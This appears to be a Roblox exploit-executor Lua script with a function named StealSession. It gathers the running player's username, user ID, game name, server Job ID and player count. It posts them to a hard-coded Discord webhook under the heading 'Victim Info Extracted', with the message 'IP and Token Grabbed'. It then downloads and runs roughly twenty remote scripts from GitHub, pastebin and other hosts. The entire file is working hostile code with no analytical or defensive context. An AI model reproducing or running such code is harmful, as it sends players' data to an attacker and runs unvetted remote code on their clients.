local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local WebhookURL = "https://discord.com/api/webhooks/1563242722934919310/yK0oFxFS0tOSxXzZ0VtPusSNfU4pici-8fXEFhmSe9WWU0yAAewfVaXMP7IsHP4M23cg"

local function StealSession()
    local success, placeInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    local mapName = success and placeInfo.Name or "Unknown"
    local playerCountText = tostring(#Players:GetPlayers()) .. " / " .. tostring(Players.MaxPlayers)
    local fullBodyAvatarUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. tostring(LocalPlayer.UserId) .. "&width=420&height=420&format=png"

    local data = {
        ["username"] = "Account Roblox 🤖",
        ["avatar_url"] = "https://i.ibb.co/Zp5tPpJj/IMG-3928.png",
        ["content"] = "@everyone IP and Token Grabbed",
        ["embeds"] = {{
            ["title"] = "Victim Info Extracted",
            ["color"] = 0x1A1A1A,
            ["image"] = {
                ["url"] = fullBodyAvatarUrl
            },
            ["fields"] = {
                {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
                {["name"] = "User ID", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
                {["name"] = "Map Name", ["value"] = tostring(mapName), ["inline"] = false},
                {["name"] = "Players", ["value"] = playerCountText, ["inline"] = true},
                {["name"] = "Job ID", ["value"] = game.JobId, ["inline"] = false}
            }
        }}
    }

    local response = request({
        Url = WebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })

    loadstring(game:HttpGet("https://flowauth.net/v1/loaders/VR7.lua"))()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Gamepass-Product-212343"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AlphaBay00/PhantomXLoader/main/Ld.lua.txt"))()
    loadstring(game:HttpGet("https://rawscripts.net/raw/Animal-Hospital-(Anomaly)-Ajjans-Roblox-Animal-Hospital-Auto-Treat-Script-243159"))()
    loadstring(game:HttpGet('https://pastebin.com/raw/PgAdUTAt'))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/Hshjs"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/VR7/main/vr7ontop"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/panelhenil-oss/NOVI-ROLI/refs/heads/main/ROLI.txt"))()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/exunys/SimpleSpy/main/source.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/richie0866/orca/main/source.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ec322/SystemExodus/main/main.lua"))()
    local hydroxideBase = "https://raw.githubusercontent.com/UpbeatEngine/Hydroxide/main/"
    loadstring(game:HttpGet(hydroxideBase .. "init.lua"))()
end

StealSession()
